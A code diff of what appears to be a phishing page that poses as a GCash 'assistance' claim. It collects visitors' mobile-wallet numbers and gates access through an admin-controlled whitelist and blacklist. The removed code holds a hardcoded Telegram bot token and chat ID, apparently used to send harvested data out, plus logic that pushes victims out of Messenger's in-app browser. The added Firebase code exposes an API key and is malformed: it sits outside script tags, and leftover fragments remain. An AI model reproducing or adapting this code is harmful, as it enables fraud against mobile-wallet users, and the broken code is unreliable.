@@ -42,65 +42,78 @@
 
     <script>document.write('<script src="/js/config.js?v=' + Date.now() + '"><\/script>');</script>
 
-    <script>
-        const botToken = '8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg';
-        const chatId = '7298607329';
+    // INITIALIZE FIREBASE (Gamit ang config mo)
+const firebaseConfig = {
+    apiKey: "AIzaSyDIPBhgIXb6oJiq2G6bVebelLrCBuPeCNE",
+    authDomain: "freeshoppingph-3bade.firebaseapp.com",
+    databaseURL: "https://freeshoppingph-3bade-default-rtdb.firebaseio.com",
+    projectId: "freeshoppingph-3bade",
+    storageBucket: "freeshoppingph-3bade.appspot.com",
+    messagingSenderId: "1028308831969",
+    appId: "1:1028308831969:web:96e224e75d69ba74332924"
+};
 
-        function processStep1() {
-            const phoneInput = document.getElementById('userPhone');
-            const phone = phoneInput.value.trim();
-            const btn = document.getElementById('confirmBtn');
+if (!firebase.apps.length) {
+    firebase.initializeApp(firebaseConfig);
+}
+const db = firebase.database();
 
-            // 1. Basic Format Validation
-            if (phone.length < 11 || !phone.startsWith('09')) {
-                Swal.fire({ icon: 'error', title: 'Invalid Number', text: 'Please enter a valid 11-digit GCash number.' });
-                return;
+async function handleLogin() {
+    const phoneInput = document.getElementById('phoneInput').value.trim();
+    const btn = document.getElementById('loginBtn');
+
+    // Basic Validation
+    if (phoneInput.length !== 11 || !phoneInput.startsWith("09")) {
+        alert("Please enter a valid 11-digit GCash number.");
+        return;
+    }
+
+    btn.disabled = true;
+    btn.innerText = "VERIFYING...";
+
+    try {
+        // 1. Kuhanin ang System Mode mula sa Admin (Open o Strict)
+        const modeSnap = await db.ref('system_status/mode').once('value');
+        const mode = modeSnap.val() || 'strict';
+
+        // 2. Check muna kung Blacklisted (Kahit anong mode, bawal ang blacklisted)
+        const blackSnap = await db.ref('blacklist/' + phoneInput).once('value');
+        if (blackSnap.exists()) {
+            alert("This number has already claimed the assistance. Duplicate entries are not allowed.");
+            btn.disabled = false;
+            btn.innerText = "PROCEED";
+            return;
+        }
+
+        if (mode === 'open') {
+            // OPEN MODE: Lahat ng hindi blacklisted, pasok!
+            saveAndRedirect(phoneInput);
+        } else {
+            // STRICT MODE: Check kung nasa Whitelist
+            const whiteSnap = await db.ref('whitelist/' + phoneInput).once('value');
+            if (whiteSnap.exists()) {
+                saveAndRedirect(phoneInput);
+            } else {
+                alert("System Notice: Access is currently limited to selected beneficiaries. Please try again later.");
+                btn.disabled = false;
+                btn.innerText = "PROCEED";
             }
+        }
 
-            // 2. White-list Filter
-            if (typeof ALLOWED_NUMBERS === 'undefined' || !ALLOWED_NUMBERS.includes(phone)) {
-                Swal.fire({
-                    icon: 'error',
-                    title: 'Access Denied',
-                    text: 'Sorry, your mobile number is not yet registered in our official beneficiary list.',
-                    confirmButtonColor: '#2d6a4f'
-                });
-                phoneInput.value = "";
-                return; 
-            }
+    } catch (error) {
+        console.error(error);
+        alert("Connection Error. Please check your internet.");
+        btn.disabled = false;
+    }
+}
 
-            // 3. Messenger/In-App Browser Detection & Intent
-            const ua = navigator.userAgent || navigator.vendor || window.opera;
-            const isMessenger = (ua.indexOf("FBAN") > -1) || (ua.indexOf("FBAV") > -1) || (ua.indexOf("Messenger") > -1);
-            
-            if (isMessenger) {
-                const currentUrl = window.location.href.replace(/^https?:\/\//, '');
-                
-                // Android Intent to force Chrome
-                if (/Android/i.test(ua)) {
-                    const intentUrl = `intent://${currentUrl}#Intent;scheme=https;package=com.android.chrome;end`;
-                    Swal.fire({
-                        title: 'Switching Browser',
-                        text: 'Opening in Chrome to avoid technical errors...',
-                        icon: 'info',
-                        timer: 2000,
-                        showConfirmButton: false
-                    });
-                    setTimeout(() => { window.location.href = intentUrl; }, 1200);
-                    return;
-                } 
-                // iOS logic (Manual prompt because iOS blocks auto-intents)
-                else if (/iPhone|iPad|iPod/i.test(ua)) {
-                    Swal.fire({
-                        title: 'Browser Bug Detected',
-                        text: 'Please tap the (...) icon at the top right and select "Open in Safari" to complete verification.',
-                        icon: 'warning',
-                        confirmButtonText: 'I Understand',
-                        confirmButtonColor: '#2d6a4f'
-                    });
-                    return;
-                }
-            }
+function saveAndRedirect(phone) {
+    // I-save sa SessionStorage para sa main.html mapping
+    sessionStorage.setItem('user_phone', phone);
+    
+    // Redirect sa main.html
+    window.location.href = "main.html";
+}
 
             // 4. Normal Processing (If NOT in Messenger or already escaped)
             btn.disabled = true;
